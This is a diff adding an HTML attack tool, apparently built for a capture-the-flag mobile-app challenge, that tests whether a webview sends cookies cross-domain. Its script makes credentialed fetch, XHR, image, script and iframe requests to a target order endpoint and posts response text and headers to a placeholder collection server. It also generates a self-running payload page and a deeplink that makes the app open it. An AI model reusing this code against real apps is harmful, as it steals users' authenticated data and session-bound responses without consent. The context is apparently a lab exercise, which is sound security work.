@@ -1,1 +1,784 @@
-..
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebView Cookie Extraction Test</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .test-section {
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            margin: 15px 0;
+            border-radius: 10px;
+            border-left: 4px solid #ff6b6b;
+        }
+        .success {
+            border-left-color: #51cf66;
+            background: rgba(81,207,102,0.1);
+        }
+        .warning {
+            border-left-color: #ffd43b;
+            background: rgba(255,212,59,0.1);
+        }
+        .error {
+            border-left-color: #ff6b6b;
+            background: rgba(255,107,107,0.1);
+        }
+        .code {
+            background: rgba(0,0,0,0.4);
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+            font-size: 14px;
+        }
+        button {
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        .status {
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            background: rgba(255,255,255,0.1);
+        }
+        .hidden {
+            display: none;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 5px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+        }
+        input::placeholder {
+            color: rgba(255,255,255,0.7);
+        }
+        .results {
+            max-height: 400px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.3);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🕸️ WebView Cookie Extraction</h1>
+        <p><strong>Theory:</strong> Request from your domain to target domain in webview might include cookies!</p>
+        
+        <div class="test-section">
+            <h2>🎯 Target Configuration</h2>
+            <label>Target Domain (where cookies exist):</label>
+            <input type="text" id="targetDomain" value="node.ctftime" placeholder="node.ctftime">
+            
+            <label>Target Endpoint:</label>
+            <input type="text" id="targetEndpoint" value="/route-sharing/routeSharing/getOrder" placeholder="/api/endpoint">
+            
+            <label>Your Data Collection Server:</label>
+            <input type="text" id="collectionServer" value="https://your-server.com/collect" placeholder="https://your-server.com/collect">
+        </div>
+
+        <div class="test-section warning">
+            <h2>⚡ Test 1: Direct Fetch with Credentials</h2>
+            <p>Test if webview sends cookies cross-domain with fetch</p>
+            <button onclick="testDirectFetch()">🚀 Test Direct Fetch</button>
+            <div id="fetchResults"></div>
+        </div>
+
+        <div class="test-section warning">
+            <h2>🖼️ Test 2: Image Request Method</h2>
+            <p>Use image src to trigger cross-domain request</p>
+            <button onclick="testImageRequest()">🖼️ Test Image Request</button>
+            <div id="imageResults"></div>
+        </div>
+
+        <div class="test-section warning">
+            <h2>📜 Test 3: Script Tag Method</h2>
+            <p>Use script tag to make cross-domain request</p>
+            <button onclick="testScriptRequest()">📜 Test Script Request</button>
+            <div id="scriptResults"></div>
+        </div>
+
+        <div class="test-section warning">
+            <h2>🏠 Test 4: Iframe Method</h2>
+            <p>Load target in iframe and monitor</p>
+            <button onclick="testIframeMethod()">🏠 Test Iframe</button>
+            <div id="iframeResults"></div>
+            <iframe id="testIframe" style="display: none;"></iframe>
+        </div>
+
+        <div class="test-section warning">
+            <h2>📡 Test 5: XMLHttpRequest Method</h2>
+            <p>Traditional AJAX request to test cookie inclusion</p>
+            <button onclick="testXHRMethod()">📡 Test XMLHttpRequest</button>
+            <div id="xhrResults"></div>
+        </div>
+
+        <div class="test-section">
+            <h2>🔍 Advanced Tests</h2>
+            <button onclick="testAllMethods()">🔥 Run All Tests</button>
+            <button onclick="testWebViewSpecific()">📱 WebView-Specific Tests</button>
+            <button onclick="generatePayload()">💾 Generate Final Payload</button>
+        </div>
+
+        <div class="test-section">
+            <h2>📊 Results Summary</h2>
+            <div id="summaryResults">
+                <p>Run tests above to see results...</p>
+            </div>
+        </div>
+
+        <div class="test-section success">
+            <h2>🛠️ Final Payload Generator</h2>
+            <div id="finalPayload" class="hidden">
+                <h3>Host this HTML file on your domain:</h3>
+                <div class="code" id="payloadCode"></div>
+                <h3>Use this deeplink:</h3>
+                <div class="code" id="deeplinkCode"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let testResults = {};
+        let testCount = 0;
+
+        function getTargetURL() {
+            const domain = document.getElementById('targetDomain').value;
+            const endpoint = document.getElementById('targetEndpoint').value;
+            return `https://${domain}${endpoint}`;
+        }
+
+        function getCollectionURL() {
+            return document.getElementById('collectionServer').value;
+        }
+
+        async function testDirectFetch() {
+            const resultsDiv = document.getElementById('fetchResults');
+            const targetURL = getTargetURL();
+            
+            resultsDiv.innerHTML = '<div class="status">🧪 Testing direct fetch with credentials...</div>';
+            
+            try {
+                const startTime = performance.now();
+                
+                // Test multiple credential modes
+                const tests = [
+                    { mode: 'include', desc: 'Include all cookies' },
+                    { mode: 'same-origin', desc: 'Same-origin only' },
+                    { mode: 'omit', desc: 'No cookies' }
+                ];
+                
+                let results = '<h3>Fetch Test Results:</h3>';
+                
+                for (const test of tests) {
+                    try {
+                        const response = await fetch(targetURL, {
+                            method: 'GET',
+                            credentials: test.mode,
+                            mode: 'cors'
+                        });
+                        
+                        const endTime = performance.now();
+                        const timing = Math.round(endTime - startTime);
+                        
+                        results += `<p>✅ <strong>${test.desc}:</strong> Status ${response.status}, ${timing}ms</p>`;
+                        
+                        // Try to exfiltrate response info
+                        if (response.ok) {
+                            try {
+                                const text = await response.text();
+                                await fetch(getCollectionURL(), {
+                                    method: 'POST',
+                                    body: JSON.stringify({
+                                        method: 'fetch',
+                                        mode: test.mode,
+                                        status: response.status,
+                                        responseLength: text.length,
+                                        timing: timing,
+                                        headers: Object.fromEntries(response.headers.entries())
+                                    })
+                                });
+                            } catch (e) {}
+                        }
+                        
+                    } catch (error) {
+                        results += `<p>❌ <strong>${test.desc}:</strong> ${error.message}</p>`;
+                    }
+                }
+                
+                resultsDiv.innerHTML = `<div class="status">${results}</div>`;
+                testResults.fetch = { success: true, details: results };
+                
+            } catch (error) {
+                resultsDiv.innerHTML = `<div class="status error">❌ Fetch test failed: ${error.message}</div>`;
+                testResults.fetch = { success: false, error: error.message };
+            }
+            
+            updateSummary();
+        }
+
+        function testImageRequest() {
+            const resultsDiv = document.getElementById('imageResults');
+            const targetURL = getTargetURL();
+            
+            resultsDiv.innerHTML = '<div class="status">🖼️ Testing image request method...</div>';
+            
+            const img = new Image();
+            const startTime = performance.now();
+            
+            img.onload = () => {
+                const timing = Math.round(performance.now() - startTime);
+                resultsDiv.innerHTML = `
+                    <div class="status success">
+                        ✅ Image loaded successfully in ${timing}ms<br>
+                        Dimensions: ${img.naturalWidth}x${img.naturalHeight}<br>
+                        <strong>This means cookies were likely sent!</strong>
+                    </div>
+                `;
+                
+                // Exfiltrate success info
+                fetch(getCollectionURL(), {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        method: 'image',
+                        success: true,
+                        timing: timing,
+                        dimensions: `${img.naturalWidth}x${img.naturalHeight}`
+                    })
+                }).catch(() => {});
+                
+                testResults.image = { success: true, timing: timing };
+                updateSummary();
+            };
+            
+            img.onerror = () => {
+                const timing = Math.round(performance.now() - startTime);
+                resultsDiv.innerHTML = `
+                    <div class="status warning">
+                        ⚠️ Image failed to load in ${timing}ms<br>
+                        But request was still made - cookies might have been sent!
+                    </div>
+                `;
+                
+                testResults.image = { success: false, timing: timing };
+                updateSummary();
+            };
+            
+            // Add cache buster to ensure fresh request
+            img.src = targetURL + '?img_test=' + Date.now();
+        }
+
+        function testScriptRequest() {
+            const resultsDiv = document.getElementById('scriptResults');
+            const targetURL = getTargetURL();
+            
+            resultsDiv.innerHTML = '<div class="status">📜 Testing script request method...</div>';
+            
+            const script = document.createElement('script');
+            const startTime = performance.now();
+            
+            script.onload = () => {
+                const timing = Math.round(performance.now() - startTime);
+                resultsDiv.innerHTML = `
+                    <div class="status success">
+                        ✅ Script loaded successfully in ${timing}ms<br>
+                        <strong>Cookies were definitely sent with this request!</strong>
+                    </div>
+                `;
+                testResults.script = { success: true, timing: timing };
+                updateSummary();
+                document.head.removeChild(script);
+            };
+            
+            script.onerror = () => {
+                const timing = Math.round(performance.now() - startTime);
+                resultsDiv.innerHTML = `
+                    <div class="status warning">
+                        ⚠️ Script failed to load in ${timing}ms<br>
+                        Request was made - cookies likely sent anyway!
+                    </div>
+                `;
+                testResults.script = { success: false, timing: timing };
+                updateSummary();
+                if (script.parentNode) document.head.removeChild(script);
+            };
+            
+            script.src = targetURL + '?script_test=' + Date.now();
+            document.head.appendChild(script);
+        }
+
+        function testIframeMethod() {
+            const resultsDiv = document.getElementById('iframeResults');
+            const targetURL = getTargetURL();
+            const iframe = document.getElementById('testIframe');
+            
+            resultsDiv.innerHTML = '<div class="status">🏠 Testing iframe method...</div>';
+            
+            const startTime = performance.now();
+            
+            iframe.onload = () => {
+                const timing = Math.round(performance.now() - startTime);
+                resultsDiv.innerHTML = `
+                    <div class="status success">
+                        ✅ Iframe loaded in ${timing}ms<br>
+                        <strong>Target page loaded - cookies were sent!</strong><br>
+                        Check network tab for the actual request details.
+                    </div>
+                `;
+                testResults.iframe = { success: true, timing: timing };
+                updateSummary();
+            };
+            
+            iframe.onerror = () => {
+                const timing = Math.round(performance.now() - startTime);
+                resultsDiv.innerHTML = `
+                    <div class="status error">
+                        ❌ Iframe failed to load in ${timing}ms
+                    </div>
+                `;
+                testResults.iframe = { success: false, timing: timing };
+                updateSummary();
+            };
+            
+            iframe.src = targetURL + '?iframe_test=' + Date.now();
+        }
+
+        function testXHRMethod() {
+            const resultsDiv = document.getElementById('xhrResults');
+            const targetURL = getTargetURL();
+            
+            resultsDiv.innerHTML = '<div class="status">📡 Testing XMLHttpRequest method...</div>';
+            
+            const xhr = new XMLHttpRequest();
+            const startTime = performance.now();
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    const timing = Math.round(performance.now() - startTime);
+                    
+                    if (xhr.status === 200) {
+                        resultsDiv.innerHTML = `
+                            <div class="status success">
+                                ✅ XHR successful! Status: ${xhr.status}, ${timing}ms<br>
+                                Response length: ${xhr.responseText.length} chars<br>
+                                <strong>Cookies were sent and response received!</strong>
+                            </div>
+                        `;
+                        
+                        // Exfiltrate the response
+                        fetch(getCollectionURL(), {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                method: 'xhr',
+                                status: xhr.status,
+                                response: xhr.responseText.substring(0, 1000), // First 1000 chars
+                                timing: timing
+                            })
+                        }).catch(() => {});
+                        
+                        testResults.xhr = { success: true, status: xhr.status, timing: timing };
+                    } else {
+                        resultsDiv.innerHTML = `
+                            <div class="status warning">
+                                ⚠️ XHR completed with status: ${xhr.status}, ${timing}ms<br>
+                                Request was made - cookies likely sent!
+                            </div>
+                        `;
+                        testResults.xhr = { success: false, status: xhr.status, timing: timing };
+                    }
+                    updateSummary();
+                }
+            };
+            
+            xhr.withCredentials = true; // Include cookies
+            xhr.open('GET', targetURL + '?xhr_test=' + Date.now(), true);
+            xhr.send();
+        }
+
+        async function testAllMethods() {
+            const methods = [
+                testDirectFetch,
+                testImageRequest,
+                testScriptRequest,
+                testIframeMethod,
+                testXHRMethod
+            ];
+            
+            for (const method of methods) {
+                await method();
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait between tests
+            }
+        }
+
+        function testWebViewSpecific() {
+            // Test webview-specific behaviors
+            const results = [];
+            
+            // Check if running in webview
+            const isWebView = /WebView|wv|Mobile/.test(navigator.userAgent);
+            results.push(`WebView detected: ${isWebView}`);
+            
+            // Check available APIs
+            results.push(`Fetch API: ${typeof fetch !== 'undefined'}`);
+            results.push(`XMLHttpRequest: ${typeof XMLHttpRequest !== 'undefined'}`);
+            results.push(`Local Storage: ${typeof localStorage !== 'undefined'}`);
+            results.push(`Session Storage: ${typeof sessionStorage !== 'undefined'}`);
+            
+            // Test CORS behavior
+            results.push(`CORS mode support: ${typeof Request !== 'undefined'}`);
+            
+            document.getElementById('summaryResults').innerHTML = `
+                <h3>WebView Environment Analysis:</h3>
+                ${results.map(r => `<p>• ${r}</p>`).join('')}
+            `;
+        }
+
+        function generatePayload() {
+            const targetURL = getTargetURL();
+            
+            const payload = `<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Extraction Test</title>
+    <meta charset="utf-8">
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f0f0f0; }
+        .log { background: #333; color: #0f0; padding: 15px; margin: 10px 0; border-radius: 5px; font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }
+        .section { margin: 20px 0; padding: 15px; background: white; border-radius: 5px; border-left: 4px solid #007bff; }
+        .success { border-left-color: #28a745; }
+        .error { border-left-color: #dc3545; }
+        .warning { border-left-color: #ffc107; }
+    </style>
+</head>
+<body>
+    <h1>🍪 WebView Cookie Extraction Test</h1>
+    <div id="status">Starting extraction tests...</div>
+    
+    <div class="section">
+        <h2>📊 Test Results</h2>
+        <div id="results"></div>
+    </div>
+    
+    <div class="section">
+        <h2>📋 Detailed Logs</h2>
+        <div class="log" id="logs"></div>
+    </div>
+    
+    <script>
+        const targetURL = '${targetURL}';
+        let logOutput = '';
+        let testResults = {};
+        
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            logOutput += '[' + timestamp + '] ' + message + '\\n';
+            document.getElementById('logs').textContent = logOutput;
+            console.log(message);
+        }
+        
+        function updateResults() {
+            const resultsDiv = document.getElementById('results');
+            let html = '';
+            
+            Object.entries(testResults).forEach(([method, result]) => {
+                const className = result.success ? 'success' : (result.error ? 'error' : 'warning');
+                html += '<div class="section ' + className + '">';
+                html += '<h3>' + method.toUpperCase() + ' Test</h3>';
+                html += '<p><strong>Status:</strong> ' + (result.success ? 'SUCCESS' : 'FAILED') + '</p>';
+                if (result.status) html += '<p><strong>HTTP Status:</strong> ' + result.status + '</p>';
+                if (result.timing) html += '<p><strong>Timing:</strong> ' + result.timing + 'ms</p>';
+                if (result.responseLength) html += '<p><strong>Response Length:</strong> ' + result.responseLength + ' chars</p>';
+                if (result.error) html += '<p><strong>Error:</strong> ' + result.error + '</p>';
+                if (result.response) {
+                    html += '<p><strong>Response Preview:</strong></p>';
+                    html += '<div class="log">' + result.response.substring(0, 500) + '</div>';
+                }
+                html += '</div>';
+            });
+            
+            resultsDiv.innerHTML = html;
+        }
+        
+        // Test 1: Fetch with credentials
+        async function testFetch() {
+            log('🚀 Testing Fetch API with credentials...');
+            const startTime = performance.now();
+            
+            try {
+                const response = await fetch(targetURL + '?method=fetch&t=' + Date.now(), {
+                    method: 'GET',
+                    credentials: 'include',
+                    mode: 'cors'
+                });
+                
+                const timing = Math.round(performance.now() - startTime);
+                const responseText = await response.text();
+                
+                testResults.fetch = {
+                    success: response.ok,
+                    status: response.status,
+                    timing: timing,
+                    responseLength: responseText.length,
+                    response: responseText,
+                    headers: Object.fromEntries(response.headers.entries())
+                };
+                
+                log('✅ Fetch completed: Status ' + response.status + ', ' + timing + 'ms, ' + responseText.length + ' chars');
+                
+                if (response.ok && responseText.length > 0) {
+                    alert('🎯 FETCH SUCCESS! Status: ' + response.status + ', Response: ' + responseText.substring(0, 100) + '...');
+                }
+                
+            } catch (error) {
+                testResults.fetch = { success: false, error: error.message };
+                log('❌ Fetch failed: ' + error.message);
+            }
+            
+            updateResults();
+        }
+        
+        // Test 2: XMLHttpRequest
+        function testXHR() {
+            log('📡 Testing XMLHttpRequest with credentials...');
+            const startTime = performance.now();
+            
+            const xhr = new XMLHttpRequest();
+            xhr.withCredentials = true;
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    const timing = Math.round(performance.now() - startTime);
+                    
+                    testResults.xhr = {
+                        success: xhr.status === 200,
+                        status: xhr.status,
+                        timing: timing,
+                        responseLength: xhr.responseText.length,
+                        response: xhr.responseText
+                    };
+                    
+                    log('📡 XHR completed: Status ' + xhr.status + ', ' + timing + 'ms, ' + xhr.responseText.length + ' chars');
+                    
+                    if (xhr.status === 200 && xhr.responseText.length > 0) {
+                        alert('🎯 XHR SUCCESS! Status: ' + xhr.status + ', Response: ' + xhr.responseText.substring(0, 100) + '...');
+                    }
+                    
+                    updateResults();
+                }
+            };
+            
+            xhr.open('GET', targetURL + '?method=xhr&t=' + Date.now(), true);
+            xhr.send();
+        }
+        
+        // Test 3: Image loading
+        function testImage() {
+            log('🖼️ Testing Image loading...');
+            const startTime = performance.now();
+            
+            const img = new Image();
+            
+            img.onload = function() {
+                const timing = Math.round(performance.now() - startTime);
+                testResults.image = {
+                    success: true,
+                    timing: timing,
+                    dimensions: img.naturalWidth + 'x' + img.naturalHeight
+                };
+                
+                log('✅ Image loaded: ' + timing + 'ms, ' + img.naturalWidth + 'x' + img.naturalHeight);
+                alert('🎯 IMAGE SUCCESS! Loaded in ' + timing + 'ms, Size: ' + img.naturalWidth + 'x' + img.naturalHeight);
+                updateResults();
+            };
+            
+            img.onerror = function() {
+                const timing = Math.round(performance.now() - startTime);
+                testResults.image = {
+                    success: false,
+                    timing: timing,
+                    error: 'Failed to load as image'
+                };
+                
+                log('❌ Image failed: ' + timing + 'ms');
+                updateResults();
+            };
+            
+            img.src = targetURL + '?method=image&t=' + Date.now();
+        }
+        
+        // Test 4: Script loading
+        function testScript() {
+            log('📜 Testing Script loading...');
+            const startTime = performance.now();
+            
+            const script = document.createElement('script');
+            
+            script.onload = function() {
+                const timing = Math.round(performance.now() - startTime);
+                testResults.script = {
+                    success: true,
+                    timing: timing
+                };
+                
+                log('✅ Script loaded: ' + timing + 'ms');
+                alert('🎯 SCRIPT SUCCESS! Loaded in ' + timing + 'ms');
+                updateResults();
+                document.head.removeChild(script);
+            };
+            
+            script.onerror = function() {
+                const timing = Math.round(performance.now() - startTime);
+                testResults.script = {
+                    success: false,
+                    timing: timing,
+                    error: 'Failed to load as script'
+                };
+                
+                log('❌ Script failed: ' + timing + 'ms');
+                updateResults();
+                if (script.parentNode) document.head.removeChild(script);
+            };
+            
+            script.src = targetURL + '?method=script&t=' + Date.now();
+            document.head.appendChild(script);
+        }
+        
+        // Run all tests
+        async function runAllTests() {
+            log('🔥 Starting comprehensive WebView cookie test...');
+            log('Target URL: ' + targetURL);
+            log('User Agent: ' + navigator.userAgent);
+            log('Current Domain: ' + window.location.hostname);
+            log('===============================================');
+            
+            document.getElementById('status').textContent = 'Running tests...';
+            
+            // Run tests with delays
+            await testFetch();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            testXHR();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            testImage();
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            testScript();
+            
+            setTimeout(() => {
+                document.getElementById('status').textContent = 'All tests completed! Check results above.';
+                log('===============================================');
+                log('🏁 All tests completed!');
+                
+                const successCount = Object.values(testResults).filter(r => r.success).length;
+                if (successCount > 0) {
+                    alert('🎉 SUCCESS! ' + successCount + ' method(s) worked! Check the logs for details.');
+                } else {
+                    alert('😞 All methods failed. Check logs for details.');
+                }
+            }, 5000);
+        }
+        
+        // Start tests immediately
+        runAllTests();
+    </script>
+</body>
+</html>`;
+
+            const deeplink = `ctfapp://action/openBrowser?url=https://your-domain.com/extract.html`;
+            
+            document.getElementById('payloadCode').textContent = payload;
+            document.getElementById('deeplinkCode').textContent = deeplink;
+            document.getElementById('finalPayload').classList.remove('hidden');
+        }
+
+        function updateSummary() {
+            const summaryDiv = document.getElementById('summaryResults');
+            
+            if (Object.keys(testResults).length === 0) {
+                summaryDiv.innerHTML = '<p>No tests completed yet.</p>';
+                return;
+            }
+            
+            let summary = '<h3>🧪 Test Results Summary:</h3>';
+            let successCount = 0;
+            
+            Object.entries(testResults).forEach(([method, result]) => {
+                const status = result.success ? '✅' : '❌';
+                const timing = result.timing ? ` (${result.timing}ms)` : '';
+                summary += `<p>${status} <strong>${method.toUpperCase()}:</strong> ${result.success ? 'Success' : 'Failed'}${timing}</p>`;
+                if (result.success) successCount++;
+            });
+            
+            if (successCount > 0) {
+                summary += `
+                    <div class="status success">
+                        <strong>🎯 BREAKTHROUGH!</strong><br>
+                        ${successCount} method(s) worked! This suggests the webview IS sending cookies cross-domain.<br>
+                        <strong>Your attack is likely feasible!</strong>
+                    </div>
+                `;
+            } else {
+                summary += `
+                    <div class="status error">
+                        <strong>🛡️ All methods failed</strong><br>
+                        The webview appears to have strong security policies.<br>
+                        Consider alternative attack vectors.
+                    </div>
+                `;
+            }
+            
+            summaryDiv.innerHTML = summary;
+        }
+
+        // Auto-start basic tests on load
+        window.onload = () => {
+            console.log('🕸️ WebView Cookie Extraction Tool Loaded');
+            console.log('This will test if the webview sends cookies cross-domain!');
+            
+            // Show current environment info
+            document.getElementById('summaryResults').innerHTML = `
+                <h3>🔍 Environment Detection:</h3>
+                <p>• User Agent: ${navigator.userAgent}</p>
+                <p>• WebView Indicators: ${/WebView|wv|Mobile/.test(navigator.userAgent) ? '✅ Detected' : '❌ Not detected'}</p>
+                <p>• Current Domain: ${window.location.hostname}</p>
+                <p><em>Run tests above to see if cross-domain cookie sending works!</em></p>
+            `;
+        };
+    </script>
+</body>
+</html>
